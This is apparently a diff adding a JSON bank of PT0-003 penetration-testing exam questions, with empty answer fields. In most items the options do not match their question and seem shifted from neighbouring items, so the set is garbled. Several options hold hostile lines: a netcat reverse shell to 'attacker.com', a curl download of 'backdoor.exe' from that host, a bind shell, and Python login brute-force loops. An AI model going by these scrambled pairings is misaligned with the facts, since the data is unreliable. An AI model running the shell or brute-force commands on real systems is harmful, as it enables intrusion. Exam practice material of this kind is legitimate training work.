+        "A. SQL injection attack",
+        "B. Buffer overflow attack",
+        "C. Denial of service attack",
+        "D. Brute force attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_65",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Type the nmap command to perform a scan that only targets a specific port.",
+      "options": [
+        "A. Buffer overflow attack",
+        "B. Cross-site scripting attack",
+        "C. VLAN hopping attack",
+        "D. SQL injection attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_66",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify any open ports on a target host. The target host is known to be running a critical service that uses TCP on a non-standard port. The target network is protected by a firewall that allows incoming TCP packets but blocks incoming ICMP and UDP packets. You suspect that the target network may be protected by an intrusion detection system (IDS) that can detect TCP SYN scanning. Type the nmap command to perform the scan.",
+      "options": [
+        "A. Ping of death attack",
+        "B. Cross-site scripting attack",
+        "C. SQL injection attack",
+        "D. DNS cache poisoning attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_67",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify any open ports on a target host. The target host is known to be running a critical service that uses the Transmission Control Protocol (TCP) on a non-standard port. The target network is protected by a firewall that allows incoming TCP packets but blocks incoming ICMP and UDP packets. Type the nmap command to perform the scan and complete the task.",
+      "options": [
+        "A. Brute force attack",
+        "B. Evil twin attack",
+        "C. Eavesdropping",
+        "D. Rogue access point attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_68",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network that is behind the Cloudflare content delivery network (CDN). The target network is protected by a firewall that blocks incoming TCP packets but allows ICMP and UDP packets. The target host is known to be running a critical service that uses the User Datagram Protocol (UDP) on a non-standard port. Type the nmap command to perform the scan.",
+      "options": [
+        "A. Jamming attack",
+        "B. MAC address spoofing attack",
+        "C. Data corruption attack",
+        "D. Evil twin attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_69",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify any open ports on a target host. The target host is known to be running several critical services that use the User Datagram Protocol (UDP). However, the target host is protected by a firewall that blocks incoming TCP packets. Type the nmap command to perform the scan.",
+      "options": [
+        "A. Password spraying attack",
+        "B. Denial of service (DoS) attack",
+        "C. SQL injection attack",
+        "D. MAC address spoofing attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_70",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "An attacker is attempting to launch a metadata service attack to gain access to sensitive information in a cloud environment. What can the cloud administrator do to prevent this type of attack?",
+      "options": [
+        "A. Eavesdropping attack",
+        "B. Evil twin attack",
+        "C. Data modification attack",
+        "D. Denial of service attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_71",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A user reports that their online banking session was hijacked, and unauthorized transactions were made from their account. The security team’s investigation reveals that the attacker used a tool to intercept and replay the user’s session, which allowed them to gain access to the user’s account. What type of attack was used in this scenario?",
+      "options": [
+        "A. Improper authentication",
+        "B. Insecure communication",
+        "C. Insecure storage",
+        "D. Insecure defaults"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_72",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a web application that allows multiple users to upload files, a security analyst has discovered that it’s possible to upload a file with the same name as an existing one. Which of the following vulnerabilities can be exploited in this scenario?",
+      "options": [
+        "A. Disable the device's wireless connectivity",
+        "B. Implement device-level authentication and encryption",
+        "C. Isolate the device on a separate network segment",
+        "D. Replace the device's firmware with a more secure version"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_73",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, the tester has successfully gained access to a company’s network and exfiltrated sensitive data. Which of the following techniques could the tester use to avoid detection during data exfiltration?",
+      "options": [
+        "A. Bluejacking",
+        "B. Injection attacks",
+        "C. Side-channel attacks",
+        "D. Physical attacks"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_74",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In order to avoid detection by an intrusion detection system (IDS), an attacker wants to make the traffic look like legitimate traffic. Which of the following techniques should the attacker use?",
+      "options": [
+        "A. Man-in-the-middle attack",
+        "B. ARP Spoofing",
+        "C. Code injection",
+        "D. Data exfiltration"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_75",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing an assessment of a client’s network infrastructure. The tester has already performed a thorough scan of the wired network and has identified all devices connected to it. The tester now wants to identify any wireless access points that may be connected to the same network. Which of the following techniques should the tester use?",
+      "options": [
+        "A. DNS spoofing",
+        "B. ARP spoofing",
+        "C. Packet filtering",
+        "D. Content filtering"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_1",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is analyzing the output from a web server’s access logs and notices that there is a high volume of requests for a specific URL that does not exist. What could this indicate?",
+      "options": [
+        "A. The web server is misconfigured",
+        "B. The web server is under a distributed denial-of-service (DDoS) attack",
+        "C. The web server is being probed for vulnerabilities",
+        "D. The web server is functioning normally"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_2",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company is considering outsourcing some of its IT operations to a third-party provider. The provider has offered a master service agreement (MSA) for the company to review. Which of the following best describes the purpose of an MSA in this context?",
+      "options": [
+        "A. To outline the specific services the provider will offer",
+        "B. To define the roles and responsibilities of both the company and the provider",
+        "C. To establish the price and payment terms for the services",
+        "D. To ensure that the provider will comply with all applicable laws and regulations"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_3",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security analyst is performing a vulnerability scan of a web application and notices that certain queries are being throttled by the server. What could be the reason for this?",
+      "options": [
+        "A. Service level agreement (SLA)",
+        "B. End of life (EOL)",
+        "C. Memorandum of understanding (MOU)",
+        "D. Non-Disclosure Agreement (NDA)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_4",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is scanning a web application and notices that certain queries are being throttled by the server, leading to a delay in the server’s response. What vulnerability could this indicate?",
+      "options": [
+        "A. The server is misconfigured",
+        "B. The server is experiencing heavy traffic",
+        "C. The web application is under attack",
+        "D. The web application has a vulnerability"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_5",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test and wants to identify potential SQL injection vulnerabilities in the target web application. The tester needs a tool that can automatically detect SQL injection vulnerabilities, identify the type of database management system in use, and extract data from the database. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Cross-site scripting (XSS)",
+        "B. Injection attacks",
+        "C. Broken authentication and session management",
+        "D. Denial-of-service (DoS)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_6",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a vulnerability assessment of a target system and wants to identify potential vulnerabilities in the operating system and installed software. The tester needs a tool that can scan for vulnerabilities, generate reports, and prioritize the identified vulnerabilities based on severity. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. route",
+        "B. pathping",
+        "C. dig",
+        "D. nslookup",
+        "E. ifconfig"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_7",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test and wants to identify potential vulnerabilities in the target web application. The tester needs a tool that can scan for common web application vulnerabilities such as SQL injection, cross-site scripting, and file inclusion vulnerabilities. Which of the following tools would best fit this need?",
+      "options": [
+        "A. SQLmap",
+        "B. John the Ripper",
+        "C. Hydra",
+        "D. Nikto"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_8",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a password security audit of a target system and wants to test the strength of the user passwords. The tester needs a tool that can perform brute-force attacks, dictionary attacks, and rule-based attacks against password hashes. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Nmap",
+        "B. Wireshark",
+        "C. Metasploit Framework",
+        "D. Nessus"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_9",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a password security audit of a target system and wants to test the strength of user passwords. The tester needs a tool that can perform brute-force attacks, dictionary attacks, and hybrid attacks against password hashes. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Nikto",
+        "B. Wapiti",
+        "C. Hydra",
+        "D. Arachni"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_10",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test and wants to identify hidden files and directories on the target web server. The tester needs a tool that can perform brute-force attacks on the server directories and find hidden files and directories. Which of the following tools would best fit this need?",
+      "options": [
+        "A. John the Ripper",
+        "B. Hydra",
+        "C. Nikto",
+        "D. Hashcat"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_11",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a cloud penetration test on a client’s Azure environment and needs to identify any weak passwords that could be exploited by attackers. The tester needs a tool that can brute-force user accounts and report on any weak passwords found. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Medusa",
+        "B. John the Ripper",
+        "C. Hydra",
+        "D. Nikto"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_12",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a cloud penetration test on a client’s AWS environment and needs to identify any misconfigurations in the cloud infrastructure that could be exploited by attackers. The tester needs a tool that can scan the environment for misconfigurations and report on any vulnerabilities found. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. John the Ripper",
+        "B. Hydra",
+        "C. DirBuster",
+        "D. Metasploit Framework"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_13",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a white-box penetration test on a target system and needs to test the system’s ability to detect steganography. The tester needs a tool that can be used to detect the presence of hidden data in audio files. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. CloudBrute",
+        "B. Nessus",
+        "C. Metasploit Framework",
+        "D. Nmap"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_14",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a white-box penetration test on a target system and needs to test the system’s ability to detect steganography. The tester needs a tool that can be used to detect the presence of hidden data in image files. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Nessus",
+        "B. Nmap",
+        "C. Scout Suite",
+        "D. Metasploit Framework"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_15",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a network penetration test on a target network and needs to perform a TCP/IP stack fingerprinting to determine the operating system of the target system. The tester needs a tool that can send custom packets and analyze the responses to determine the operating system of the target system. Which of the following tools would best fit this need?",
+      "options": [
+        "A. SQLMap",
+        "B. Nmap",
+        "C. Metasploit Framework",
+        "D. Steghide"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_16",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test on a target web application and needs to identify vulnerabilities such as SQL injection and cross-site scripting (XSS). The tester needs a tool that can scan the web application for vulnerabilities and provide detailed information on how to remediate them. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. SQLMap",
+        "B. Openstego",
+        "C. Nmap",
+        "D. Metasploit Framework"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_17",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a wireless penetration test on a target network and needs to crack the network’s WPS PIN in order to gain access to the network. The tester needs a tool that can exploit a vulnerability in the WPS protocol to recover the network’s WPS PIN. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Wireshark",
+        "B. Hping",
+        "C. Metasploit Framework",
+        "D. Nmap"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_18",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a wireless penetration test on a target network and needs to crack the network’s Wi-Fi password. The tester needs a tool that can capture wireless traffic and use it to crack the password. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Nmap",
+        "B. Metasploit Framework",
+        "C. Burp Suite",
+        "D. OWASP ZAP"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_19",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a wireless penetration test on a target network and needs to identify the wireless devices within range of the tester’s device. The tester needs a tool that can scan for wireless devices and display detailed information about them, including their MAC address and manufacturer. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Wireshark",
+        "B. Kismet",
+        "C. Aircrack-ng suite",
+        "D. Reaver"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_20",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing reconnaissance on a target organization and needs to gather information about its online presence, including its website, social media profiles, and other online properties. The tester needs a tool that can query public databases and display detailed information about the target organization’s online presence in a visual graph format. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Burp Suite",
+        "B. Wireshark",
+        "C. Aircrack-ng suite",
+        "D. John the Ripper"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_21",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing reconnaissance on a target domain and needs to gather information about the domain’s ownership and registration details. The tester needs a tool that can query the domain registration database and display detailed information about the domain owner, including contact details and registration history. Which of the following tools would best fit this need?",
+      "options": [
+        "A. Wireshark",
+        "B. Kismet",
+        "C. Aircrack-ng suite",
+        "D. Nessus"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_22",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing reconnaissance on a target domain and needs to gather information about the domain’s DNS configuration, including its DNS server IP addresses and MX records. The tester needs a tool that can query the domain’s DNS server and display detailed information about its DNS configuration. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Wireshark",
+        "B. Nmap",
+        "C. Maltego",
+        "D. WHOIS"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_23",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a vulnerability assessment of a target system and needs to identify potential exploits for known vulnerabilities in the target system. The tester needs a tool that can search through a database of known exploits and display detailed information about each exploit, including the exploit’s code and usage. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Nmap",
+        "B. Wireshark",
+        "C. WHOIS",
+        "D. Metasploit Framework"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_24",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a code review of an application and needs to analyze the application’s assembly code in order to identify potential vulnerabilities or security flaws. The tester needs a tool that can be used to disassemble and debug the application code. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Burp Suite",
+        "B. Wireshark",
+        "C. Nmap",
+        "D. Nslookup"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_25",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a web application penetration test and wants to identify common vulnerabilities in the target web server. The tester needs a tool that can identify potential vulnerabilities such as misconfigurations, outdated software, and server-side scripting errors. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Metasploit Framework",
+        "B. Wireshark",
+        "C. SearchSploit",
+        "D. Nessus"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_26",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester has discovered an exploit that allows an attacker to enumerate users on a remote system. The following code snippet is found in the exploit code. What is the purpose of this code?",
+      "options": [
+        "A. Metasploit Framework",
+        "B. Wireshark",
+        "C. OllyDbg",
+        "D. Nessus"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_27",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester has identified a code snippet that allows remote access to a target system. Which of the following code snippets could be used to launch remote access?",
+      "options": [
+        "A. Metasploit Framework",
+        "B. John the Ripper",
+        "C. Hydra",
+        "D. Nikto"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_28",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester wants to examine exploit code that is capable of downloading a file from a remote system. Which of the following lines of code would be used to download the file in this scenario?",
+      "options": [
+        "A. This code sends an HTTP GET request to the \"/users\" endpoint on the remote system and prints the response to the console",
+        "B. This code sends an HTTP POST request to the \"/users\" endpoint on the remote system and returns the response",
+        "C. This code sends an HTTP GET request to the \"/passwords\" endpoint on the remote system and prints the response to the console",
+        "D. This code sends an HTTP GET request to the \"/users\" endpoint on the local system and prints the response to the console"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_29",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester wants to send an HTTP GET request to a target website and receive a response. Which of the following Python code snippets will accomplish this task?",
+      "options": [
+        "A. netcat -e /bin/bash attacker.com 4444",
+        "B. ssh -L 80:localhost:80 [email protected]",
+        "C. curl -O http://attacker.com/backdoor.exe",
+        "D. nc -nlvp 4444 -e /bin/bash"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_30",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester wants to brute force a login page with a list of usernames and passwords. Which of the following Python code snippets will accomplish this task?",
+      "options": [
+        "A. wget -O file.exe http://192.168.1.100/file.exe",
+        "B. curl -o file.exe http://192.168.1.100/file.exe",
+        "C. ftp 192.168.1.100 -u username password -i file.exe",
+        "D. scp [email protected]:/path/to/file.exe"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_31",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A tester wants to create a script to scan a network range and identify hosts with port 22 open. Which of the following code snippets written in Ruby will accomplish this task?",
+      "options": [
+        "A. import requests target_url = \"http://www.example.com\" response = requests.get(target_url) print(response.text)",
+        "B. import urllib.request target_url = \"http://www.example.com\" response = urllib.request.urlopen(target_url) print(response.read())",
+        "C. import http.client target_host = \"www.example.com\" target_port = 80 conn = http.client.HTTPConnection(target_host, target_port) conn.request(\"GET\", \"/\") response = conn.getresponse() print(response.read())",
+        "D. import socket target_host = \"www.example.com\" target_port = 80 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((target_host, target_port)) client.send(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\") response = client.recv(4096) print(response)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_32",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has found a PowerShell script on a target system that appears to be running a series of commands to enumerate system information. Which of the following commands would the tester expect to find in the script?",
+      "options": [
+        "A. import requests url = \"https://www.example.com/login\" usernames = [\"user1\", \"user2\", \"user3\"] passwords = [\"pass1\", \"pass2\", \"pass3\"] for username in usernames: for password in passwords: data = {\"username\": username, \"password\": password} response = requests.post(url, data=data) if \"Login failed\" not in response.text: print(\"Successful login: {} - {}\".format(username, password)) break",
+        "B. import requests url = \"https://www.example.com/login\" usernames = [\"user1\", \"user2\", \"user3\"] passwords = [\"pass1\", \"pass2\", \"pass3\"] for username in usernames: for password in passwords: data = {\"username\": username, \"password\": password} response = requests.post(url, data=data) if \"Login successful\" in response.text: print(\"Successful login: {} - {}\".format(username, password)) break",
+        "C. import requests url = \"https://www.example.com/login\" usernames = [\"user1\", \"user2\", \"user3\"] passwords = [\"pass1\", \"pass2\", \"pass3\"] for username in usernames: for password in passwords: data = {\"username\": username, \"password\": password} response = requests.post(url, data=data) if response.status_code == 200: print(\"Successful login: {} - {}\".format(username, password)) break",
+        "D. import requests url = \"https://www.example.com/login\" usernames = [\"user1\", \"user2\", \"user3\"] passwords = [\"pass1\", \"pass2\", \"pass3\"] for username in usernames: for password in passwords: data = {\"username\": username, \"password\": password} response = requests.post(url, data=data) if response.ok: print(\"Successful login: {} - {}\".format(username, password)) break"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_33",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a penetration tester, you have identified a vulnerable machine and have successfully gained access to it through a remote exploit. You have discovered that the system uses a bash shell, and you want to create a backdoor that will allow you to maintain access to the system after you’ve completed your testing. What command can be used to create a bash backdoor that will allow you to maintain access to a compromised system?",
+      "options": [
+        "A. require 'socket' (1..255).each do |i| begin Timeout::timeout(1) { TCPSocket.new(\"192.168.1.#{i}\", 22) } puts \"192.168.1.#{i} has port 22 open\" rescue end end",
+        "B. require 'nmap/xml' nmap = Nmap::XML.new `sudo nmap -sT -p 22 192.168.1.0/24` nmap.each_host do |host| if host.up? host.each_port do |port| puts \"#{host.addr} has port #{port.number} open\" end end end",
+        "C. require 'socket' hosts = %w[192.168.1.1 192.168.1.2 192.168.1.3 192.168.1.4] hosts.each do |host| begin Timeout::timeout(1) { TCPSocket.new(host, 22) } puts \"#{host} has port 22 open\" rescue end end",
+        "D. require 'net/ssh' hosts = %w[192.168.1.1 192.168.1.2 192.168.1.3 192.168.1.4] hosts.each do |host| begin Net::SSH.start(host, 'username', :password => 'password') do |ssh| puts \"#{host} has port 22 open\" end rescue end end"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_34",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, the tester discovered that the client’s employees were not following proper password hygiene practices. As part of the “lessons learned” process, which of the following should the client do to address this issue?",
+      "options": [
+        "A. cat",
+        "B. ls",
+        "C. get-childitem",
+        "D. cd"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_35",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, a tester utilized various tools to conduct the test. Once the test is complete, what should be the next step for the tester in regard to the tools used during the test?",
+      "options": [
+        "A. netcat",
+        "B. echo",
+        "C. cd",
+        "D. whoami"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_36",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "After a recent penetration testing engagement, a security analyst discovers that the penetration testers created some user accounts with elevated privileges to perform testing. What post-engagement cleanup activity should the analyst perform to ensure the removal of these accounts and their associated access rights?",
+      "options": [
+        "A. Implement a mandatory password change policy every six months",
+        "B. Provide training to employees on proper password hygiene practices",
+        "C. Hire a third-party security firm to conduct regular penetration testing",
+        "D. Monitor all employee activity on the company network"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_37",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "After conducting a penetration test on a client’s network, the tester set up a reverse shell to maintain access to the target system. Which of the following is a recommended post-engagement cleanup activity to remove the reverse shell?",
+      "options": [
+        "A. The tester should delete all the tools and binaries used during the engagement",
+        "B. The tester should keep the tools and binaries used during the engagement for future engagements",
+        "C. The tester should move the tools and binaries used during the engagement to a shared drive",
+        "D. The tester should encrypt the tools and binaries used during the engagement"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_38",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, the tester discovers a critical vulnerability that could potentially cause severe damage to the client’s system. The client is reluctant to address the issue, fearing that it would cause major disruptions in their operations. What should the penetration tester do in this situation?",
+      "options": [
+        "A. Update the access control list (ACL) for the user accounts to revoke the elevated privileges",
+        "B. Notify the system administrator to remove the accounts and revoke the associated privileges",
+        "C. Change the password for the user account to an invalid value",
+        "D. Delete the user accounts and revoke the associated privileges"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_39",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you have found a critical vulnerability that could result in a major data breach. Who should you communicate this finding to, and in what manner?",
+      "options": [
+        "A. Delete the compromised user account",
+        "B. Remove the malware from the system",
+        "C. Reinstall the operating system on the target system",
+        "D. Kill the reverse shell process and delete any associated files"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_40",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, who should be the technical contact for the pentester to communicate with regarding technical issues and vulnerabilities discovered during testing?",
+      "options": [
+        "A. Continue the engagement and notify the client of the findings in the final report",
+        "B. Escalate the issue to the client's senior management and regulatory authorities",
+        "C. Explain the severity of the issue and the consequences of inaction to the client, encouraging them to address the issue immediately",
+        "D. Wait for the client to decide on the remediation plan"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_41",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing project, who is the primary contact for the penetration tester to communicate with?",
+      "options": [
+        "A. You should communicate this finding to both the technical and primary contacts, as it is a critical finding that could impact the security of the entire organization. You should use a secure communication method, such as encrypted email or a secure messaging platform",
+        "B. You should communicate this finding to the technical contact only, as they are the ones responsible for implementing technical controls. You should use a non-secure communication method, such as phone or email",
+        "C. You should communicate this finding to the primary contact only, as they are the ones responsible for making decisions regarding the organization's security posture. You should use a secure communication method, such as encrypted email or a secure messaging platform",
+        "D. You should not communicate this finding to anyone, as it could potentially cause damage to the organization"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_42",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a company’s server room, a security auditor discovers that one of the servers is missing, and there is no record of it being decommissioned. The server contained sensitive data, including customers’ financial information. Which remediation would the auditor MOST likely recommend in the report?",
+      "options": [
+        "A. The legal team",
+        "B. The project manager",
+        "C. The IT department",
+        "D. The HR department"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_43",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester wants to write a script that will automate the process of submitting a login form with a list of usernames and passwords. The script will read the usernames and passwords from a file and submit them to the form until a successful login is achieved. Which of the following JavaScript code snippets will accomplish this task?",
+      "options": [
+        "A. The security operations center",
+        "B. The CEO of the organization",
+        "C. The project manager",
+        "D. The IT team"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_44",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you have successfully gained access to a workstation within the target organization. You obtained a password hash of the domain administrator account from the workstation’s memory. What is the next step in performing a Pass the Hash attack?",
+      "options": [
+        "A. Install biometric controls in the server room",
+        "B. Conduct mandatory vacations for IT staff",
+        "C. Implement video surveillance in the server room",
+        "D. Implement role-based access control to the server room"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
